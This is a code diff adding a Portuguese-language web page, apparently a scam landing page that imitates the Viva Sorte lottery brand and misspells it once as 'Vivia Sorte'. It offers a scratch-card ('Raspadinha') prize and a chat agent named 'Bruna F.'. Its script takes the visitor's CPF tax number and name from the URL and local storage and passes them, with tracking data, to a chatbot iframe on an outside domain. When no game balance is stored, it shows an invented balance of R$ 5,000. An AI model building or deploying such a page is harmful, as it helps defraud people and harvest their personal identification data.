@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Acesso Seguro</title>
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon" sizes="16x16">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: linear-gradient(180deg,
+          #0B63E5 0%,
+          /* Azul Viva Sorte forte */
+          #1E7BFF 40%,
+          /* Azul médio */
+          #4DA3FF 75%,
+          /* Azul claro */
+          #EAF2FF 100%
+          /* Branco azulado suave */
+        );
+      font-family: 'Montserrat', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow-x: hidden;
+    }
+
+    /* HEADER */
+    header {
+      width: 100%;
+      background: linear-gradient(90deg,
+          #0B63E5 0%,
+          /* Azul principal */
+          #1E7BFF 50%,
+          /* Azul destaque */
+          #0B63E5 100%
+          /* Azul principal */
+        );
+
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    header img {
+      height: 28px;
+      flex-shrink: 0;
+    }
+
+    .barra-amarela {
+      width: 3px;
+      height: 20px;
+      border-radius: 6px;
+      background: #FFF100;
+      flex-shrink: 0;
+    }
+
+    .titulo-raspadinha {
+      color: white;
+      font-weight: 600;
+      font-size: 16px;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    .user-info {
+      margin-left: auto;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-shrink: 0;
+    }
+
+    .saldo {
+      background-color: #29A745;
+      color: #fff;
+
+      padding: 6px 10px;
+      border-radius: 8px;
+
+      font-size: 14px;
+      font-weight: 600;
+      line-height: 1;
+
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+
+      white-space: nowrap;
+      /* 👈 impede quebra de linha */
+      min-height: 32px;
+      /* 👈 trava a altura */
+    }
+
+    .card-nome {
+      background-color: white;
+      color: #3F8BFC;
+      padding: 8px 12px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .card-nome svg path {
+      fill: #3F8BFC !important;
+    }
+
+
+    .card-nome svg {
+      width: 18px;
+      height: 18px;
+      flex-shrink: 0;
+    }
+
+    /* CARD PRINCIPAL */
+    .card {
+      width: 92%;
+      max-width: 420px;
+      margin-top: 35px;
+      background: #fff;
+      border-radius: 14px;
+      padding: 20px;
+    }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding-bottom: 14px;
+      border-bottom: 1.5px solid #e5e5e5;
+      margin-bottom: 14px;
+    }
+
+    .avatar {
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    .titulo-nome {
+      font-weight: 700;
+      font-size: 16px;
+      margin-bottom: 4px;
+      color: #000;
+    }
+
+    .subtitulo {
+      font-size: 12px;
+      color: #777;
+    }
+
+    iframe {
+      margin-top: 10px;
+      width: 100%;
+      height: 460px;
+      border: none;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    /* MOBILE AJUSTADO */
+    @media (max-width: 430px) {
+      header {
+        padding: 10px 14px;
+        gap: 10px;
+      }
+
+      .titulo-raspadinha {
+        font-size: 15px;
+      }
+
+      .saldo {
+        padding: 8px 14px;
+        font-size: 14px;
+      }
+
+      .card-nome {
+        padding: 8px 12px;
+        font-size: 14px;
+        max-width: 95px;
+      }
+
+      iframe {
+        height: 500px;
+      }
+    }
+
+    @media (max-width: 430px) {
+      header {
+        padding: 10px 14px;
+        gap: 1px;
+      }
+
+      .titulo-raspadinha {
+        font-size: 15px;
+      }
+
+      .saldo {
+        padding: 8px 14px;
+        font-size: 14px;
+      }
+
+      .card-nome {
+        padding: 8px 12px;
+        font-size: 14px;
+        max-width: 110px;
+      }
+
+      .card {
+        padding: 18px;
+        margin-top: 25px;
+      }
+
+      .form-title {
+        font-size: 17px;
+      }
+
+      .form-subtitle {
+        font-size: 12px;
+        margin-bottom: 20px;
+      }
+
+      .opcoes-chave {
+        grid-template-columns: 1fr;
+        gap: 8px;
+      }
+
+      .opcao-chave {
+        padding: 12px;
+      }
+
+      .form-input {
+        padding: 14px;
+        font-size: 14px;
+      }
+
+      .btn-continuar {
+        padding: 16px;
+        font-size: 15px;
+      }
+
+      .loading-content {
+        padding: 20px;
+      }
+
+      .loading-title {
+        font-size: 20px;
+      }
+
+      .loading-subtitle {
+        font-size: 14px;
+      }
+    }
+
+    @media (max-width: 350px) {
+      .user-info {
+        flex-direction: column;
+        align-items: flex-end;
+        gap: 5px;
+      }
+
+      .card-nome {
+        max-width: 80px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <img src="images/logo.webp" alt="Logo">
+
+    <div class="barra-amarela"></div>
+    <span class="titulo-raspadinha">Raspadinha</span>
+
+    <div class="user-info">
+      <div class="saldo" id="saldoCarteira">R$ 0,00</div>
+
+      <span class="card-nome" id="nomeUser">
+        <svg fill="#000000" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path
+            d="M12 12c2.7 0 5-2.3 5-5s-2.3-5-5-5-5 2.3-5 5 2.3 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z">
+          </path>
+        </svg>
+        Usuário
+      </span>
+    </div>
+  </header>
+
+  <!-- CARD PRINCIPAL -->
+  <div class="card">
+    <div class="card-header">
+      <img src="images/phototypebot.png" class="avatar">
+      <div>
+        <div class="titulo-nome">Bruna F.</div>
+        <div class="subtitulo">Atendimento do Vivia Sorte Online</div>
+      </div>
+    </div>
+
+    <iframe id="iframeBot" allowfullscreen="" src=""></iframe>
+  </div>
+
+  <!-- SCRIPT CAPTURA E ENVIA PARAMETROS -->
+  <script>
+    // Função para obter parâmetros da URL
+    function getParam(name) {
+      const url = new URL(window.location.href);
+      return url.searchParams.get(name);
+    }
+
+    // Função para capturar todos os parâmetros UTM
+    function getUTMParams() {
+      const utmParams = {};
+      const utmKeys = [
+        'utm_source',
+        'utm_medium',
+        'utm_campaign',
+        'utm_term',
+        'utm_content',
+      ];
+
+      utmKeys.forEach(key => {
+        const value = getParam(key);
+        if (value) {
+          utmParams[key] = value;
+        }
+      });
+
+      return utmParams;
+    }
+
+    // Captura dados do usuário do localStorage e URL
+    function getUsuario() {
+      const fromUrl = {
+        cpf: getParam("cpf"),
+        nome: getParam("nome")
+      };
+
+      let fromLocal = {};
+      try {
+        fromLocal = JSON.parse(localStorage.getItem('usuario_dados') || '{}');
+      } catch (e) { }
+
+      let estadoJogo = {};
+      try {
+        estadoJogo = JSON.parse(localStorage.getItem('estado_jogo') || '{}');
+      } catch (e) { }
+
+      return {
+        cpf: fromUrl.cpf || fromLocal.cpf || fromLocal.CPF || localStorage.getItem('cpf_usuario') || "",
+        nome: fromUrl.nome || fromLocal.nome || fromLocal.NOME || "Usuário",
+        saldo: estadoJogo.saldo || 5000 // Fallback para 5000 se não houver saldo do jogo
+      };
+    }
+
+    const usuario = getUsuario();
+    const utmParams = getUTMParams();
+
+    // Atualiza saldo no header
+    if (document.getElementById("saldoCarteira")) {
+      document.getElementById("saldoCarteira").textContent = `R$ ${usuario.saldo.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;
+    }
+
+    // Atualiza nome do usuário no header
+    let primeiroNome = usuario.nome.split(" ")[0];
+
+    document.getElementById("nomeUser").innerHTML = `
+    <svg fill="#000000" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+      <path d="M12 12c2.7 0 5-2.3 5-5s-2.3-5-5-5-5 2.3-5 5 2.3 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z"/>
+    </svg>
+    ${primeiroNome}
+  `;
+
+    // Constrói URL do Typebot com todos os parâmetros
+    let iframeUrl = "https://chat.atendimentos-brasil.online/raspadinha-pat64dx";
+
+    let params = [];
+
+    // Adiciona dados do usuário
+    if (usuario.cpf) params.push("cpf=" + encodeURIComponent(usuario.cpf));
+    if (usuario.nome) params.push("nome=" + encodeURIComponent(usuario.nome));
+
+    // Adiciona parâmetros UTM
+    Object.keys(utmParams).forEach(key => {
+      params.push(`${key}=${encodeURIComponent(utmParams[key])}`);
+    });
+
+    // Adiciona data/hora da sessão (opcional, para tracking)
+    params.push("session_start=" + encodeURIComponent(new Date().toISOString()));
+
+    // Adiciona referência da página
+    params.push("page_referrer=" + encodeURIComponent(document.referrer));
+
+    if (params.length > 0) {
+      iframeUrl += "?" + params.join("&");
+    }
+
+    // Carrega o iframe com todos os parâmetros
+    document.getElementById("iframeBot").src = iframeUrl;
+
+    // Função adicional: Salva UTMs no localStorage para uso futuro
+    function saveUTMToLocalStorage() {
+      if (Object.keys(utmParams).length > 0) {
+        const utmData = {
+          ...utmParams,
+          timestamp: new Date().toISOString(),
+          landing_page: window.location.href
+        };
+        localStorage.setItem('utm_tracking', JSON.stringify(utmData));
+      }
+    }
+
+    // Executa a função de salvamento
+    saveUTMToLocalStorage();
+
+    // Log para debug (remover em produção)
+    console.log("UTMs capturados:", utmParams);
+    console.log("URL do iframe:", iframeUrl);
+  </script>
+
+
+</body>
+
+</html>
